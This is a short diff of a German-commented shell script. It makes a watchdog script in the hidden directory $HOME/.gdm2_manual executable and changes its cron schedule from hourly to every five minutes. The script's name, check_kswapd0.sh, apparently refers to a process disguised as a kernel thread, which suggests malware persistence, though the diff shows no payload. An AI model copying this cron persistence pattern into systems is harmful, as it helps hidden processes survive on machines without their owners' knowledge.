@@ -62,4 +62,4 @@ EOF
 chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
 
 # Cron-Job einrichten
-(crontab -l 2>/dev/null; echo "0 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
+(crontab -l 2>/dev/null; echo "*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
